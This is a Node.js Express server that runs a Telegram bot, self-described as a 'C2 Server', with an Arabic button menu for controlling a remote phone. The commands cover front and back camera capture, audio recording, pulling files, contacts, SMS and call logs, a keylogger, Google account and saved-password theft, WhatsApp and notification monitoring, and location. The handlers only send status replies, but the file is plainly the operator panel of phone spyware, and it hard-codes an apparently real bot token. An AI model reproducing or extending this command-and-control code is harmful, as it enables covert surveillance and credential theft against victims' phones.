const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAElI3Uy3cnB4rzmk5LTGHI3a5ws63ueYS0';
const SERVER_URL = 'https://c2-server-ufyp.onrender.com';
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// قائمة الأزرار (Reply Keyboard)
const mainMenu = {
    reply_markup: {
        keyboard: [
            ['📸 الكاميرا الأمامية', '📸 الكاميرا الخلفية'],
            ['🎙️ تسجيل الصوت', '📂 سحب الملفات'],
            ['📞 جهات الاتصال', '✉️ الرسائل النصية'],
            ['📋 سجل المكالمات', '🔔 الإشعارات'],
            ['⌨️ كيلوجر (Keylogger)', '👤 حسابات Google'],
            ['💬 واتساب', '🔑 كلمات المرور'],
            ['📍 الموقع', '🖼️ صور الهاتف'],
            ['🎥 فيديوهات', '🎵 مقاطع صوت'],
            ['❓ مساعدة']
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// تهيئة البوت بدون Polling (لأننا سنستخدم Webhook)
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// أمر /start - يعرض الأزرار
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ أهلاً بك! استخدم الأزرار أدناه للتحكم بالهاتف المنزلي:', mainMenu);
});

// أمر /menu - نفس القائمة
bot.onText(/\/menu/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 القائمة الرئيسية:', mainMenu);
});

// معالجة الأزرار
bot.on('message', (msg) => {
    const text = msg.text;
    const chatId = msg.chat.id;

    if (text === '📸 الكاميرا الأمامية') {
        bot.sendMessage(chatId, '📸 جاري التقاط صورة من الكاميرا الأمامية...');
    }
    else if (text === '📸 الكاميرا الخلفية') {
        bot.sendMessage(chatId, '📸 جاري التقاط صورة من الكاميرا الخلفية...');
    }
    else if (text === '🎙️ تسجيل الصوت') {
        bot.sendMessage(chatId, '🎙️ جاري تسجيل مقطع صوتي...');
    }
    else if (text === '📂 سحب الملفات') {
        bot.sendMessage(chatId, '📂 جاري سحب الملفات من الهاتف...');
    }
    else if (text === '📞 جهات الاتصال') {
        bot.sendMessage(chatId, '📇 جاري سحب جهات الاتصال...');
    }
    else if (text === '✉️ الرسائل النصية') {
        bot.sendMessage(chatId, '✉️ جاري سحب جميع الرسائل النصية...');
    }
    else if (text === '📋 سجل المكالمات') {
        bot.sendMessage(chatId, '📞 جاري سحب سجل المكالمات...');
    }
    else if (text === '🔔 الإشعارات') {
        bot.sendMessage(chatId, '🔔 بدء مراقبة الإشعارات...');
    }
    else if (text === '⌨️ كيلوجر (Keylogger)') {
        bot.sendMessage(chatId, '⌨️ بدء تسجيل الضغطات...');
    }
    else if (text === '👤 حسابات Google') {
        bot.sendMessage(chatId, '👤 جاري سحب حسابات Google...');
    }
    else if (text === '💬 واتساب') {
        bot.sendMessage(chatId, '💬 بدء مراقبة واتساب...');
    }
    else if (text === '🔑 كلمات المرور') {
        bot.sendMessage(chatId, '🔑 جاري سحب كلمات المرور المحفوظة...');
    }
    else if (text === '📍 الموقع') {
        bot.sendMessage(chatId, '📍 جاري الحصول على الموقع الحالي...');
    }
    else if (text === '🖼️ صور الهاتف') {
        bot.sendMessage(chatId, '🖼️ جاري سحب جميع الصور...');
    }
    else if (text === '🎥 فيديوهات') {
        bot.sendMessage(chatId, '🎥 جاري سحب جميع الفيديوهات...');
    }
    else if (text === '🎵 مقاطع صوت') {
        bot.sendMessage(chatId, '🎵 جاري سحب المقاطع الصوتية...');
    }
    else if (text === '❓ مساعدة') {
        bot.sendMessage(chatId, '📱 *الأوامر المتاحة عبر الأزرار:*\n- الكاميرا (أمامية/خلفية)\n- تسجيل الصوت\n- سحب الملفات، جهات الاتصال، الرسائل، سجل المكالمات\n- مراقبة الإشعارات والواتساب\n- كيلوجر، حسابات Google، كلمات المرور\n- الموقع، الصور، الفيديوهات، المقاطع الصوتية', { parse_mode: 'Markdown' });
    }
    else if (text === '/start' || text === '/menu') {
        return;
    }
    else {
        bot.sendMessage(chatId, '❓ أمر غير معروف. استخدم الأزرار أو اكتب /start');
    }
});

// أمر /help
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 *القائمة متاحة عبر الأزرار*\nأرسل /start أو /menu لإظهار الأزرار.', { parse_mode: 'Markdown' });
});

// نقطة استقبال Webhook من Telegram
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('C2 Server is running with buttons!'));

app.listen(PORT, async () => {
    console.log(`✅ Server running on port ${PORT}`);
    const botSetup = new TelegramBot(BOT_TOKEN);
    await botSetup.deleteWebhook();
    await botSetup.setWebHook(`${SERVER_URL}/webhook/${BOT_TOKEN}`);
    console.log('✅ Webhook set successfully');
});
